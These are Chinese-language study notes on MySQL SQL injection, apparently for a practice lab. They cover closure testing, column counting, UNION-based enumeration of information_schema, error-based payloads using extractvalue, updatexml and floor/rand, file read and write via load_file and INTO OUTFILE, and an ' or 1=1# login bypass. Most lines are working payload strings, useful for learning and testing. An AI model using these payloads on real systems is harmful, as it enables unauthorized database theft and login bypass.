# 常用参数
● user()：当前数据库用户

● database()：当前数据库名

● version()：当前使用的数据库版本、

● @@version_compile_os：查看操作系统

● @@datadir：数据库存储数据路径

● concat()：联合数据，将多个字符串连接成一个字符串

● group_concat()：将查询到的数据连接成一个字符串输出，用于联合查询

● concat_ws()：第一个参数是分隔符，将后续所有参数使用分隔符联合起来

● substr(a,b,c)/substring(a,b,c):限制a的输出，从b位开始输出c位

● hex() 和 unhex()：用于 hex 编码解码

● ASCII()：返回字符的 ASCII 码值

● CHAR()：把整数转换为对应的字符

● load_file()：以文本方式读取文件，在 Windows 中，路径设置为 \\

● select xxoo into outfile '路径'：权限较高时可直接写文件

# 前置测试
## 构造闭合
?id=1'

测试时可能出现一下报错：

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near **''1'' LIMIT 0,1'** at line 1

借此报错可以判断闭合方式

接着加上--+/#注释后面的代码，使用AND 1=1/AND 1=2进一步验证

## 查询列数
order by 5

or

group by 5

一个一个尝试:-D

## 测试回显位
union select 1,2,3...

# SELECT查询
## 查询数据库库名
所有数据库：
select group_concat(schema_name) from information_schema.schemata

当前数据库：
select database()

## 查询表名
select group_concat(table_name) from information_schema.tables where table_schema='数据库名'

## 查询列名
select group_concat(column_name) from information_schema.columns where table_name='表名'

## 查询数据
select group_concat(列名1,'-',列名2) from 数据库名.表名

# 报错注入
## extractvalue()
报错原理：
select extractvalue(doc,'/book/title') from xml;

↓

select extractvalue(doc,'~book/title') from xml；

extractvalue()报错一次最多显示32个字符，使用substr()拼接

示例：

?id=-1' union select 1,2,extractvalue(1,concat(0x7e,(select substr(**group_concat(schema_name)**,1,30) **from information_schema.schemata**)))--+

## upadtexml()
报错原理：

select updatexml(doc,'/book/tittle/','1')from xml;

↓

select updatexml(doc,'~book/tittle','1')from xml;

同extractvalue(),使用substr()拼接

示例：

?id=-1' union select 1,2,updatexml(1,concat(0x7e,(select substr(**group_concat(schema_name)**,1,30) **from information_schema.schemata**)),3)--+

## floor()

select count(*),concat_ws('-',(select database()),floor(rand(0)2)) as a from users group by a; //固定报错，显示报错信息；
1. rand(0) 的确定性：当给 rand() 指定种子参数(如0)时，它会生成可预测的伪随机序列
2. floor() 取整：floor(rand(0)*2) 会将结果转换为0或1
3. GROUP BY 冲突：在分组操作时，MySQL会多次计算这个值，导致临时表中出现主键冲突

示例：

?id=-1' union select 1,count(*),concat_ws('-',**(select substr(group_concat(schema_name),1,31) from information_schema.schemata)**,floor(rand(0)*2)) as a from information_schema.tables group by a--+

> information_schema.tables是数据库中一定存在的表，用作计数，不用于查询

# POST提交注入

username:admin' or 1=1#

password:123

示例：
 
uname=' union select 1,group_concat(schema_name) from information_schema.schemata#&passwd=123&Submit=Submit


